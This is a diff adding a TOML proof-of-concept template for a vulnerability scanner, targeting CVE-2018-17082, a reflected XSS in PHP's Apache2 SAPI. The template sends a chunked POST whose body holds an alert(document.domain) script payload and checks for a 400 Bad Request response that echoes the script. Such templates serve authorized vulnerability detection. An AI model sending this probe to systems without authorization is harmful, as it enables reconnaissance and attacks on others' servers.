@@ -1,0 +1,43 @@
+[info]
+author = "AVE"
+description = "检测 PHP Apache2 SAPI 分块传输编码 XSS 漏洞，通过发送 Transfer-Encoding: chunked 的 POST 请求，在分块体中注入 HTML 脚本，若响应返回 Bad Request 并回显注入脚本则存在漏洞"
+id = "POC-AVE-2018-0121"
+name = "CVE-2018-17082 PoC"
+severity = "medium"
+tags = ["cve-2018-17082"]
+vuln_id = [
+    "CVE-2018-17082",
+    "AVE-2018-0121",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = "<script>alert(document.domain)</script>"
+type = "raw"
+
+[poc.requests.headers]
+Transfer-Encoding = "chunked"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Bad Request<script>alert(document.domain)</script>"]
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["text/html"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [400]
+type = "status"
